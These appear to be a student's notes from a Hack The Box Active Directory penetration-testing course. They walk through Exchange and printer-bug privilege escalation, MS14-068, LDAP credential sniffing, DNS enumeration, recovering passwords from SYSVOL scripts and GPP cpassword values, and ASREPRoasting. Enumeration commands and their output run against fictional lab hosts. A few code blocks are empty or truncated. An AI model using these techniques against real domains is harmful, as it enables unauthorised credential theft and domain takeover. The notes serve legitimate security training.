**Exchange Related Group Membership**
- When scanning the network, if we come across a default installation of exchange within an AD environment (With no split-administration model) opens up many attack vectors. 
- The group **Exchange Windows Permission** is our target, and any user within that group has the permssion to write a DACL to the domain object. This can be leveraged to give a user DCSync privileges. 

**Exchange PrivESC**
https://github.com/gdedrouas/Exchange-AD-Privesc

- Another thing to note is that if we are able to identify an exchange server and gaining domain admin access, we can then dump credentials that are stored within memory which could produce 10s if not 100s of cleartext credentials or NTLM Hashes. 
- This is due to users logging in to OWA and Exchange caching their credentials in memory after a successful login. 

**PrivExchange**
- PrivExchange attack results from a flaw in the Exchange Server PushSubscription feature, which allows any domain user with a mailbox to force the Exchange server to authenticate to any host provided by the client over HTTP. 

**Printer Bug**
- The printer bug is a flaw in the MS-RPRN protocol (Print System Remote Protocol). 
- To leverage this flaw, any domain user can connect to the spool's named pipe with the RpcOpenPrinter method and use the RpcRemoteFindFirstPrinterChangeNotificationEx method, and force the server to authenticate to any host provided by the client over SMB. 
- Spooler service is run by SYSTEM. 
- This attack can be leverage to relay to LDAP and grant your attacking account DCSync privileges to retrieve all password hashes. 
- We can utilize the tool referenced below to check if the machine is vulnerable.

**Enumerating for MS-PRN Printer Bug**
```powershell-session
PS C:\htb> Import-Module .\SecurityAssessment.ps1
PS C:\htb> Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL

ComputerName                        Status
------------                        ------
ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL   True
```

**MS14-068**
- This was a flaw in the kerberos protocol, which could be leveraged along with standard domain user credentials to elevate privileges to Domain Admin. 
- The vulnerability allowed a forged PAC to be accepted by the KDC as legitimate. This can be leveraged to create a fake PAC, presenting a user as a member of the Domain Administrators or other privileged group. It can be exploited with tools such as the [Python Kerberos Exploitation Kit (PyKEK)](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek) or the Impacket toolkit. The only defense against this attack is patching. The machine [Mantis](https://app.hackthebox.com/machines/98) on the Hack The Box platform showcases this vulnerability.

**Sniffing LDAP Credentials**
- Many applications and printers store LDAP credentials in their web admin console to connect to the domain. These consoles are often left with weak or default passwords. 
- In this case, we can set up a netcat listener on our attack host, change the LDAP IP to our attack host, and send a request back to our attack host, and often times the credentials are sent in cleartext. 

**Enumerating DNS Records**
- When looking for DNS Records, we can use a tool called adidnsdump to enumerate all DNS records with a valid domain user account.
- The tool works because, by default, all users can list the child objects of a DNS zone in an AD environment. 

**Using adidnsdump**
```shell-session
realCustampin@htb[/htb]$ adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 

Password: 

[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Querying zone for records
[+] Found 27 records
```

**Viewing the Contents of the records.csv**
```shell-session
realCustampin@htb[/htb]$ head records.csv 

type,name,value
?,LOGISTICS,?
AAAA,ForestDnsZones,dead:beef::7442:c49d:e1d7:2691
AAAA,ForestDnsZones,dead:beef::231
A,ForestDnsZones,10.129.202.29
A,ForestDnsZones,172.16.5.240
A,ForestDnsZones,172.16.5.5
AAAA,DomainDnsZones,dead:beef::7442:c49d:e1d7:2691
AAAA,DomainDnsZones,dead:beef::231
A,DomainDnsZones,10.129.202.29
```
- As we can see, there is a .csv file that shows us the zone information for all the DNS zones. 

**Using the -r Option to Resolve Unknown Records**
```shell-session
realCustampin@htb[/htb]$ adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r

Password: 

[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Querying zone for records
[+] Found 27 records
```

**Finding the Hidden Records in the records.csv File**
```shell-session
realCustampin@htb[/htb]$ head records.csv 

type,name,value
A,LOGISTICS,172.16.5.240
AAAA,ForestDnsZones,dead:beef::7442:c49d:e1d7:2691

### Other Misconfigurations 
- There are many other misconfigurations that can be used to further your access within a domain. 

**Password in Description Field**
- Sensitive information such as account passwords are sometimes found in the user account Description or Notes fields and can be quickly enumerated using PowerView. 

```powershell-session
PS C:\htb> Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}

samaccountname description
-------------- -----------
administrator  Built-in account for administering the computer/domain
guest          Built-in account for guest access to the computer/domain
krbtgt         Key Distribution Center Service Account
ldap.agent     *** DO NOT CHANGE ***  3/12/2012: Sunsh1ne4All!
```

**PASSWD_NOTREQD Field**
- It is possible to come across domain accounts with the passwd_notreqd field set in the userAccountControl attribute. If set, they could have a shorter password or no password if the domain allows it. 

```powershell-session
PS C:\htb> Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol

samaccountname                                                         useraccountcontrol
--------------                                                         ------------------
guest                ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
mlowe                                PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
ehamilton                            PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
$725000-9jb50uejje9f                       ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT
nagiosagent                                                PASSWD_NOTREQD, NORMAL_ACCOUNT
```

**Credentials in SMB Shares and SYSVOL Scripts**
- The SYSVOL Share can be a gold mine for information when enumerating SMB Shares. 

```powershell-session
PS C:\htb> ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts

    Directory: \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts


Mode                LastWriteTime         Length Name                                                                 
----                -------------         ------ ----                                                                 
-a----       11/18/2021  10:44 AM            174 daily-runs.zip

-a----         3/7/2022   9:41 AM         144138 Logon Banner.htm                                                     
-a----         3/8/2022   2:56 PM            979 reset_local_admin_pass.vbs  
```
- We can now look at the reset_local_admin_pass.vbs script for any information in the script. 

**Finding a Password in the Script**
```powershell-session
PS C:\htb> cat \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts\reset_local_admin_pass.vbs

On Error Resume Next
strComputer = "."
 
Set oShell = CreateObject("WScript.Shell") 
sUser = "Administrator"
sPwd = "!ILFREIGHT_L0cALADmin!"
 
Set Arg = WScript.Arguments
If  Arg.Count > 0 Then
sPwd = Arg(0) 'Pass the password as parameter to the script
End if
 
'Get the administrator name
Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")

<SNIP>
```

### Group Policy Preferences (GPP) Passwords
- When a new GPP is created, a .xml file is created in the SYSVOL share, which is also cached locally on endpoints that the the Group Policy applies to. These files can include those used to: 
	- Map drives (drives.xml)
	- Create local users
	- Create printer config files (printers.xml)
	- Creating and updating services (services.xml)
	- Creating scheduled tasks (scheduledtasks.xml)
	- Changing local admin passwords.
- These files can contain an array of information. The **cpassword** atrribute value is AES-256 bit encrypted, but Microsoft published the AES private key on MSDN, which can be used to decrypt the password. 
- If the cpassword attribute value is received, we can use gpp-decrypt utility to decrypt the password as follows. 

```shell-session
realCustampin@htb[/htb]$ gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE

Password1
```

**Locating and Retrieving GPP Passwords with CrackMapExec**
```shell-session
realCustampin@htb[/htb]$ crackmapexec smb -L | grep gpp

[*] gpp_autologin             Searches the domain controller for registry.xml to find autologon information and returns the username and password.
[*] gpp_password              Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.
```

**Using CrackMapExec's gpp_autologin Module**
```shell-session

### ASREPRoasting 
- It is possible to obtain the Ticket Granting Ticket (TGT) for any account that has the Do not require Kerberos pre-authentication setting enabled. 
- The authentication service request (AS_REP) is encrypted with the account's password, and any domain user can request it. 

**Enumerating for DONT_REQ_PREAUTH Value using Get-DomainUser**
```powershell-session
PS C:\htb> Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl

samaccountname     : mmorgan
userprincipalname  : mmorgan@inlanefreight.local
useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH
```

- Another way that we can do this attack, we can provide a user list to the Impacket Toolkit tool GetNPUsers.py to query all accounts the have the Kerberos Pre-Auth not required and then provide the TGT for each account found which can be used to crack offline.

### Group Policy Object  (GPO) Abuse
- Group Policies, when used correctly, are amazing for applying settings to Computer and User objects on an AD Environment. 
- GPO misconfigurations can be abused to perform the following attacks:
	- Adding additional rights to a user (such as SeDebugPrivilege, SeTakeOwnershhipPrivilege, or SeImpersonatePrivilege)
	- Adding a local admin user to one or more hosts 
	- Creating an immediate scheduled task to perform any number of actions. 
- We can enumerate GPO Information using many tools we've been using such as PowerView and BloodHound.
